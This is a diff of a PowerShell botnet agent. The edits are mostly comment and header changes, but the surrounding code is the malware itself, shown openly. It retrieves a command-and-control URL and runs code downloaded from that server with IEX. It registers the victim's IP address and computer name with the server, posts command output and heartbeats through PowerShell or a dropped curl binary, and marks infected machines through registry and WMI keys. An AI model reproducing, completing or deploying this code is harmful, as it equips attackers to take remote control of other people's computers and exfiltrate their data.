@@ -56,6 +56,7 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 			[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 		}
 (New-Object System.Net.WebClient).AllowWriteStreamBuffering = $false
+
 ################## MAIN VARIABLES PREPARATION #########################         
 $c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") # Retreive good C2 URL and each execution
 [string] $Global:keyreadgetC2 = "KEYTOREADGETC2"
@@ -105,9 +106,10 @@ for($i=0; $i -lt $gp.Name.Length; $i++){ $admin_member = $gp.Name.Item($i)
     if ($admin_member -eq $CurrentSession){ 
 	[string] $Global:IsAdminMember = $true }
 }
-######################################################################
 
-# Test PS version and download CurL if the version is lower than 3. Also try to install Choco and update powershell to v3+         ROOT_FOLDER
+
+############### TEST POWERSHELL VERSION AND PREPAPRE STUFF ######################
+# Test PS version and download CurL if the version is lower than 3. Also try to install Choco and upgrade powershell to v3+     ROOT_FOLDER
 [string] $Global:pshversion = $PSVersionTable.psversion.Major
 if ($pshversion -lt 3) {
 	$pversion = 2
@@ -129,7 +131,7 @@ if ($pshversion -lt 3) {
 		}
 		
 	}	
-#Installation of Chocolatey 
+#Installation of Chocolatey and upgrade shell
 if ($upgradepshell -eq "yes") {
 	$InstallDir="C:\ProgramData\choco"
 	$env:chocolateyInstall=$InstallDir
@@ -137,10 +139,11 @@ if ($upgradepshell -eq "yes") {
 	SET PATH=%PATH%;C:\ProgramData\Choco\bin;
 	$env:chocolateyUseWindowsCompression = 'true'
 	choco install powershell -y	
-	[string] $Global:pshversion = $PSVersionTable.psversion.Major
+	$pshversion = $PSVersionTable.psversion.Major
 	}
 
-############## GENERAL FUNCTIONS ############## 
+
+############## GENERAL FUNCTIONS ##################################### 
 		function base64EncodeText {
 			param( [string]$Text )
 			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
@@ -510,8 +513,10 @@ $r = $r + "---- PC Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, 
 		persistAuto
 		}			
 
-########## ACTIONS & BOT COMMANDS #######################
-# Main function
+
+########### ACTIONS & BOT COMMANDS ##################################
+
+#### MAIN FUNCTIONS BLOCK ####
 Function Invoke-Pnt {
     Write-Host "Action !" -ForegroundColor Yellow;
 	Function Invoke-drn {
@@ -2690,7 +2695,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/setM
 		}
 	}	
 }
-## Create and initialize bot instance on C2C Server
+# Create and initialize bot instance on C2C Server
 Function InitializeBot {
 	$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1] #
 	$computerName = (gi env:\Computername).Value #
@@ -2729,7 +2734,7 @@ Function InitializeBot {
 			executer -runLocal $Command
 		} else { Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/LINK_FOLDER/add.php" -Method POST -Body $postParams -UserAgent $BotuserAgent }					
 		}
-	# Add HelloOnline -  control
+	# Add HelloOnline -  Monitor online status
 	if ($pshversion -lt 3) {
 		$Command2 = "$env:userprofile\AppData\cl.exe -X POST -F pc=$pc $c2c/ROOT_FOLDER/LINK_FOLDER/hello.php"
 		executer -runLocal $Command2
@@ -2737,7 +2742,9 @@ Function InitializeBot {
 		Invoke-WebRequest -Uri "$c2c/ROOT_FOLDER/LINK_FOLDER/hello.php" -Method POST -Body $postParams2 -UserAgent $BotuserAgent
 	}
 }
-## Curl for Communication with c2c if Powershell version is least than 3
+
+#### CURL BLOCK ####
+# Curl for Communication with c2c if Powershell version is lower than 3
 Function Curl { # Used Curl to post command result
 	[CmdletBinding()] param( 
 		[string]$pc,
@@ -2778,7 +2785,8 @@ Function Curl_updateCmd { # Used Curl to update a command after autopilot analyz
 		$Command = "$env:userprofile\AppData\cl.exe -A $BotuserAgent -X POST -F cmd=$cmd -F pc=$pc $c2c/ROOT_FOLDER/LINK_FOLDER/pilot.php"
 		executer -runLocal $Command
 	}	
-################################################################################ 	
+
+##### ZOMBIE ACTIVATION BLOCK ##### 	
 ## Test if bot is already present on PC, if not it create instance of bot in C2 and zombie ID  on the local system (regOpskey,wmiOpskey)
 if(($regOpskey) -AND !($wmiOpskey)){	
 	if (!(get-itemproperty -path HKCU:\Software\$regOpskey -name "$regOpskey").$regOpskey) { 
